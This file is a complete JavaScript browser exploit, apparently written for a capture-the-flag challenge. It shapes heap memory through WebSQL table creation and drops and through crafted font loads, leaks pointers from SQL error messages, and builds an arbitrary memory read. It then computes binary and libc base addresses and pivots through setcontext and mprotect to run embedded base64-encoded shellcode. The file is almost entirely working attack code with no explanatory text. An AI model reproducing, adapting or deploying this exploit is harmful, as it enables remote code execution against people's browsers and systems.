var db_name = Math.random().toString(36).substring(7);
var db = openDatabase(db_name, '1.0', 'pwnage', 2 * 1024 * 1024);
var spray_cnt = 0x100;
var chunk_sz = 0x1400 - 0x10 - 0x30;
var tbl_prefix = "p".repeat(0x30);
var leak = '';

function run_all(statements, stmt_func, tx_func, err_cb) {
    db.transaction((tx) => {
        for(let i = 0; i < statements.length; i++){
            tx.executeSql(statements[i], [], stmt_func, err_cb);
            // console.log(statements[i]);
        }
    }, (a,b)=>{}, tx_func);
}

function run_one(statement, stmt_func, err_cb) {
    db.transaction((tx) => {
        tx.executeSql(statement, [], stmt_func, err_cb);
    }, (a,b)=>{}, (a,b)=>{});
}

function pwn() {
	var statements = [];
	var col_name = 'A'.repeat(chunk_sz);
	var col_list = [];
	for (let i = 0; i < 2; i++) {
		statements.push(`CREATE TABLE tbl${tbl_prefix}${i}(${col_name})`);
	}
	var col_list = [];
	for (let i = 0; i < 7; i++) { col_list.push('A'.repeat(chunk_sz - 5) + i.toString(16).padStart(5, '0')); }
	statements.push(`CREATE TABLE tbl${tbl_prefix}1337(${col_list.join(', ')})`);
	var col_list = [];
	for (let i = 0; i < 3; i++) { col_list.push('A'.repeat(chunk_sz - 5) + i.toString(16).padStart(5, '0')); }
	statements.push(`CREATE TABLE tbl${tbl_prefix}pog(${col_list.join(', ')})`);
	run_all(statements, (x,y)=>{}, part2, (a,b)=>{});
}
function part2() {
	alert('part2 start');
	var statements = [];
	var col_name = 'A'.repeat(chunk_sz);
	statements.push(`DROP TABLE tbl${tbl_prefix}1337`);
	statements.push(`DROP TABLE tbl${tbl_prefix}pog`);
	var col_list = [];
	// for (let i = 0; i < 4; i++) { col_list.push('A'.repeat(chunk_sz - 5) + i.toString(16).padStart(5, '0')); }
	// statements.push(`CREATE TABLE tbl${tbl_prefix}dope(${col_list.join(', ')})`);
	run_all(statements, (x,y)=>{}, part3, (a,b)=>{});
}
function part3() {
	alert('part 3 start');
	var font = new FontFace('aaa', 'url(new.ttf)');
	font.load().then(function(loaded) {
		document.fonts.add(loaded);
		document.getElementById('target').style.fontFamily = 'aaa';
		setTimeout(part4, 1000);
	});
}
function part4() {
	alert('part 4 start');
	var statements = [];
	var col_name = 'A'.repeat(chunk_sz);

	statements.push(`CREATE TABLE tbl${tbl_prefix}bruh(${col_name})`);
	statements.push(`DROP TABLE tbl${tbl_prefix}bruh`);
	statements.push(`DROP TABLE tbl${tbl_prefix}0`);

	run_all(statements, (x,y)=>{}, (x,y)=>{}, (x,y)=>{});
	statements = [];
	statements.push(`SELECT * FROM tbl${tbl_prefix}1`);
	run_all(statements, (x,y)=>{}, part5p, geterr);
}
function calcmult(ptr) {
	if (ptr < 0x100000000) return [];
	bottom = Number(ptr & 0xffffffffn);
	limit = bottom >>> (8 * 3);
	var res = [];
	for (let i = 0; i < 3; i++) {
		byte = bottom & 0xff;
		if (byte > limit) return [];
		else {
			// too lazy to understand math
			var ok = -1;
			var cands = [Math.floor(byte/limit*0xff), Math.ceil(byte/limit*0xff)];
			for (var cand of cands) {
				var tmp = limit * cand + 0x80;
				var tmpres = (tmp+(tmp>>>8))>>>8;
				if (tmpres == byte) {
					ok = cand;
					break;
				}
			}
			if (ok == -1) return [];
			res.push(ok.toString(16).padStart(2,"0"));
		}
		bottom >>>= 8;
	}
	res.push(limit.toString(16).padStart(2,"0"));
	return res;
}
var prepremult = [];
function part5p() {
	var res = parseleak();
	prepremult = calcmult(res[1] + 0x10n);
	if (prepremult.length != 4) return;
	alert(`part 5 preload start: 0x${res[1].toString(16)}`);
	var font = new FontFace('aac', `url(leak.ttf?a=${prepremult.join('')})`);
	font.load().then(function(loaded) {
		document.fonts.add(loaded);
		part5(res);
	});
}
function part5(res) {
	var statements = [];
	var col_name = 'A'.repeat(0x1a00 - 0x40);
	var col_name_o = 'A'.repeat(chunk_sz);

	statements.push(`CREATE TABLE tbl${tbl_prefix}0(${col_name_o})`);
	statements.push(`CREATE TABLE tbl${tbl_prefix}bruh(${col_name_o})`);

	for (let i = 0; i < 1; i++) {
		statements.push(`CREATE TABLE tbl${tbl_prefix}aight${i}(${col_name})`);
	}

	var col_list = [];
	// statements.push(`CREATE TABLE tbl${tbl_prefix}push(${col_name})`);
	col_list.push('zzzz07 DEFAULT \'A\''); // important; 
	for (let i = 1; i < 0x1520/0x20; i++) { col_list.push('x' + i.toString(16).padStart(5, '0') + ' DEFAULT \'A\''); }
	statements.push(`CREATE TABLE tbl${tbl_prefix}champ(${col_list.join(', ')})`);

	// statements.push(`CREATE TABLE tbl${tbl_prefix}usethis(${'B'.repeat(chunk_sz)})`);

	statements.push(`CREATE TABLE tbl${tbl_prefix}forpng(${col_name})`);
	statements.push(`DROP TABLE tbl${tbl_prefix}forpng`);

	for (let i = 0; i < 6; i++) { col_list.push('A'.repeat(0x7ff0 - 5) + i.toString(16).padStart(5, '0')); }
	statements.push(`CREATE TABLE tbl${tbl_prefix}huge(${col_list.join(', ')})`);
	statements.push(`DROP TABLE tbl${tbl_prefix}huge`);

	statements.push(`SELECT * FROM sqlite_master`); // end sentinel

	statements.push(`DROP TABLE tbl${tbl_prefix}bruh`);

	statements.push(`CREATE TABLE forblob(content BLOB)`);

	statements.push(fakestruct1(res[1] + 0x10n));

	run_all(statements, (x,y)=>{setarbread(statements)}, (x,y)=>{part6p(res)}, (x,y)=>{});
}
var arbreadres = [];
function arbread_u(ptr) {
	var ctelist = [];
	for (let i = 0; i < 0x1520/0x20; i++) { ctelist.push(`c${i}`); }
	var prom = new Promise((resolve)=>{run_all([fakestruct1(ptr), `INSERT INTO tbl${tbl_prefix}champ DEFAULT VALUES`], (x,y)=>{}, (x,y)=>{
		run_all([`WITH v(${ctelist.join(', ')}) AS (SELECT * FROM tbl${tbl_prefix}champ) SELECT HEX(c0) FROM v`], (x,r)=>{
			resolve(Object.values(r.rows.item(r.rows.length - 1))[0]);
		}, (x,y)=>{}, (x,y)=>{});
	}, (x,y)=>{})});
	return prom;
}
async function arbread(ptr) {
	var res = '';
	var out = '';
	while (res == '') {
		res = await arbread_u(ptr);
		if (res == '') out += '00';
		ptr += 1n;
	}
	return out+res;
}
function fakestruct1(base) {
	var content = i2b(0n) + i2b(0n); // base
	content += i2b(0x69n) + i2b(base);// + i2b(base) + '\x00'.repeat(0x68) + i2b(0x1337n);
	content = content.padEnd(0x13c0, '\x00');
	var blob = content.split("").map(x=>x.charCodeAt(0).toString(16).padStart(2,"0")).join("");
	return `INSERT INTO forblob(content) VALUES(X'${blob}')`
}
var stmt_idx_0 = 0;
function setarbread(arr) {
	if (arr[stmt_idx_0] == `SELECT * FROM sqlite_master`) {
		document.getElementById('target').style.fontFamily = 'aac';
	}
	stmt_idx_0 += 1;
}
function part6p(res) {
	var font = new FontFace('aab', `url(part2.ttf?a=${prepremult.join('')})`);
	font.load().then(function(loaded) {
		document.fonts.add(loaded);
		part6(res);
	});
}
function part6(res) {
	var statements = [];

	var col_name_o = 'A'.repeat(chunk_sz);

	statements.push(`CREATE TABLE tbl${tbl_prefix}bruh(${col_name_o})`);

	var col_list = [];
	col_list.push('b'.repeat(0x1200 - 0x40));
	for (let i = 1; i < 0x13e0/0x20; i++) { col_list.push('x' + i.toString(16).padStart(5, '0')); }
	statements.push(`CREATE TABLE tbl${tbl_prefix}read(${col_list.join(', ')})`);

	statements.push(`DROP TABLE tbl${tbl_prefix}bruh`);

	run_all(statements, (x,y)=>{}, (x,y)=>{part7p(res)}, (x,y)=>{});
}
function ia2i(ia) {
	var ii = 0n;
	var off = 1n;
	for (let i = 0; i < 8; i++) {
		if (i >= ia.length) { val = 0n; }
		else {val = BigInt(ia[i]);}
		ii |= val * off;
		off <<= 8n;
	}
	return ii;
}
function unhex(s) {
	var ia = [];
	for (let i = 0; i <= s.length - 2; i+=2) {
		ia.push(parseInt(s.substring(i, i+2), 16));
	}
	return ia;
}
function part7p(res) {
	arbread(res[1] - 0x2800n + 1n).then((val) => {
		console.log(val);
		part8(res, ia2i(unhex(val)) << 8n );
	})
}
function part8(res, ptr1200) {
	console.log(`VTable array:  0x${ptr1200.toString(16)}`)
	var statements = [];
	var col_name_o = 'A'.repeat(chunk_sz);
	var col_name_oo = 'A'.repeat(0x1200 - 0x40);

	statements.push(`CREATE TABLE tbl${tbl_prefix}bruh(${col_name_o})`);

	var n = (0xff8-8) / 0x8;
	for (let i = 0; i < n; i++) {
		statements.push(`CREATE VIRTUAL TABLE tbl${tbl_prefix}leakvirt${i} USING fts3()`);
	}

	statements.push(`DROP TABLE tbl${tbl_prefix}read`);
	statements.push(`INSERT INTO forblob(content) VALUES (X\'${'00'.repeat(0x11c0)}\')`);


	statements.push(`CREATE VIRTUAL TABLE tbl${tbl_prefix}leakvirtfinal USING fts3()`);

	statements.push(`DROP TABLE tbl${tbl_prefix}bruh`);

	run_all(statements, (x,y)=>{}, (x,y)=>{part9(res, ptr1200)}, (x,y)=>{});
}
function part9(res, ptr1200) {
	var FTS3_OFFSET = 0xa694918n;
	var GETADDRINFO_OFFSET = 0xaaa8948n;
	var GETADDRINFO_LIBC_OFFSET = 0x107cc0n;

	console.log(ptr1200+8n);
	arbread(ptr1200 + 8n).then((val) => {
		alert(val);
		arbread(res[0] ^ ia2i(unhex(val)) + 0x10n).then((val1) => {
			alert(val1);
			arbread(ia2i(unhex(val1)) + 0x8n).then((val2) => {
				console.log(val2);
				arbread(ia2i(unhex(val2))).then((val3) => {
					var binleak = ia2i(unhex(val3));
					console.log(`Binary leak:  0x${binleak.toString(16)}`);
					var binbase = binleak - FTS3_OFFSET;
					var gotloc = binbase + GETADDRINFO_OFFSET;
					arbread(gotloc).then((val4) => {
						var libcleak = ia2i(unhex(val4));
						var libcbase = libcleak - GETADDRINFO_LIBC_OFFSET;
						partx(res, libcbase, binbase);
					})
				})
			})
		})
	})
}
function partx(res, libcbase, binbase) {
	var statements = [];
	var col_name = 'A'.repeat(0x2800 - 0x40);
	var col_name_o = 'A'.repeat(chunk_sz);

	// statements.push(`CREATE TABLE tbl${tbl_prefix}0(${col_name_o})`);
	// statements.push(`CREATE TABLE tbl${tbl_prefix}bruh(${col_name_o})`);
	statements.push(fakestruct2(res[1] + 0x10n, libcbase, binbase));

	var n = (0x2000-0x20) / 0x8;
	for (let i = 0; i < n; i++) {
		statements.push(`CREATE VIRTUAL TABLE tbl${tbl_prefix}virt${i} USING fts3()`);
	}

	for (let i = 0; i < 6; i++) {
		statements.push(`CREATE TABLE tbl${tbl_prefix}nsize${i}(${col_name})`);
	}

	statements.push(`DROP TABLE tbl${tbl_prefix}nsize3`);

	var col_list = [];

	for (let i = 0; i < 6; i++) { col_list.push('A'.repeat(0x7ff0 - 5) + i.toString(16).padStart(5, '0')); }
	statements.push(`CREATE TABLE tbl${tbl_prefix}huge(${col_list.join(', ')})`);
	statements.push(`DROP TABLE tbl${tbl_prefix}huge`);

	statements.push(`DROP TABLE tbl${tbl_prefix}nsize2`);

	statements.push(`CREATE VIRTUAL TABLE tbl${tbl_prefix}virtfinal USING fts3()`);

	// statements.push(`DROP TABLE tbl${tbl_prefix}bruh`);
	
	statements.push(`SELECT * FROM sqlite_master`); // end sentinel

	statements.push(`CREATE TABLE lol(ok BLOB)`);


	run_all(statements, (x,y)=>{overwriteptr(statements)}, (x,y)=>{}, (x,y)=>{console.log(y.message)});
}
function fakestruct2(base, libcbase, binbase) {
	// var content = i2b(0n) + i2b(0n); // base
	// content += i2b(base + 0x8n) + i2b(0n) + i2b(base) + '\x00'.repeat(0x70) + i2b(jmp);
	// content = content.padEnd(0x13c0, '\x01');
	var SETCONTEXT_OFFSET = 0x52110n + 53n; // 53 to offset directly to mov rsp, [rdi+0xa0]
	var MPROTECT_OFFSET = 0xa428c60n;
	var JMP_RSP = 0x2edee0dn;

	var c_arr = Array(0x218 / 8).fill(0n);
	c_arr[2] = base + 0x100n - 0x80n;
	c_arr[4] = base;
	c_arr[2 + 0x100/8] = libcbase + SETCONTEXT_OFFSET;
	c_arr[2 + 0xa8/8] = binbase + MPROTECT_OFFSET;
	c_arr[2 + 0xa0/8] = base + 0x200n;
	c_arr[2 + 0x68/8] = (base>>12n)<<12n;
	c_arr[2 + 0x70/8] = 0x4000n;
	c_arr[2 + 0x88/8] = 7n;
	c_arr[2 + 0x200/8] = binbase + JMP_RSP;

	var shellcode_b = 'SDHbaDsxAQGBNCQBAQEBSLhESVNQTEFZPVBIieJTUkiJ4ki4AQEBAQEBAQFQSLgueWJgbWIBAUgxBCRIuC91c3IvYmluUEiJ51NXSInmSMfAOwAAAA8F';
	var shellcode = atob(shellcode_b);
	var content = c_arr.map(x=>i2b(x)).join("") + shellcode;
	content = content.padEnd(0x13c0, '\x01');

	var blob = content.split("").map(x=>x.charCodeAt(0).toString(16).padStart(2,"0")).join("");
	alert(blob.substring(0, 32+2*3));
	return `INSERT INTO forblob(content) VALUES(X'${blob}')`
}
var stmt_idx = 0;
function overwriteptr(arr) {
	if (arr[stmt_idx] == `SELECT * FROM sqlite_master`) {
		document.getElementById('target').style.fontFamily = 'aab';
	}
	stmt_idx += 1;
}
function b2i(bytes) {
	var tmp = 0n;
	for (let i = bytes.length - 1; i >= 0; i--)  {
		tmp <<= 8n;
		tmp |= BigInt(bytes[i].charCodeAt(0));
	}
	return tmp;
}
function i2b(n) {
	var res = [];
	for (let i = 0; i < 8; i++)  {
		res.push(String.fromCharCode(Number(n & 0xffn)));
		n >>= 8n;
	}
	return res.join('');
}
function geterr(tx, err) {
	leak = err.message;
	console.log('heyy');
}
function parseleak() {
	var colname = leak.split(': ')[1];
	var firstq = b2i(colname.substring(0x1400, 0x1400+8).split(''));
	var secondq = b2i(colname.substring(0x1408, 0x1400+0x10).split(''));
	var leakedptr = firstq ^ secondq;
	console.log(`1st QWORD: 0x${firstq.toString(16)}`)
	console.log(`2nd QWORD: 0x${secondq.toString(16)}`)
	console.log(`The leak:  0x${leakedptr.toString(16)}`)
	return [secondq, leakedptr];
}